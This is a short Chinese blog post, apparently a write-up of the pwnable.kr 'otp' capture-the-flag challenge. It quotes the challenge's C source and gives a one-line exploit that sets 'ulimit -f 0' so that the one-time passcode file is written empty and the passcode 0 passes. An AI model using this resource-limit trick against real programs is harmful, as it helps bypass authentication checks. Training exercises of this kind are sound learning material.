---
title: kr_otp
date: 2020-02-10 10:01:07
tags:
- pwn
- pwnable.kr
---

# pwnable.kr otp

### 0x0 补充知识

[Pwnable.kr 提示之 otp 篇](https://www.jianshu.com/p/73c030cb12e0)

### 0x1 分析

看一下安全性：

<img src="https://i.loli.net/2020/02/10/OwSRxMryTeQAvhb.png" style="zoom:50%;" />

直接看源码吧：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(int argc, char* argv[]){
        char fname[128];
        unsigned long long otp[2];

        if(argc!=2){
                printf("usage : ./otp [passcode]\n");
                return 0;
        }

        int fd = open("/dev/urandom", O_RDONLY);	
        if(fd==-1) exit(-1);

        if(read(fd, otp, 16)!=16) exit(-1);		//get 16 bytes random
        close(fd);

        sprintf(fname, "/tmp/%llu", otp[0]);
        FILE* fp = fopen(fname, "w");					//first 8 bytes to new a file
        if(fp==NULL){ exit(-1); }
        fwrite(&otp[1], 8, 1, fp);						//last 8 bytes save at fname
        fclose(fp);

        printf("OTP generated.\n");

        unsigned long long passcode=0;
        FILE* fp2 = fopen(fname, "r");				
        if(fp2==NULL){ exit(-1); }
        fread(&passcode, 8, 1, fp2);					//get the last 8 bytes to long long	
        fclose(fp2);

        if(strtoul(argv[1], 0, 16) == passcode){
                printf("Congratz!\n");
                system("/bin/cat flag");
        }
        else{
                printf("OTP mismatch\n");
        }

        unlink(fname);
        return 0;
}
```

好像没有溢出的点。看了别人的提示说可以看看bash 的 `ulimit` 命令。

发现刚好原来可以这么玩。233333

我把师傅的提示和write up贴在下面了。

### 0x2 EXP

```bash
ulimit -f 0 && python -c "import os; os.system('./otp 0')"
```

[write up](https://github.com/JackoQm/CTF-Writeups/tree/master/Pwnable.kr/Rookiss/otp)

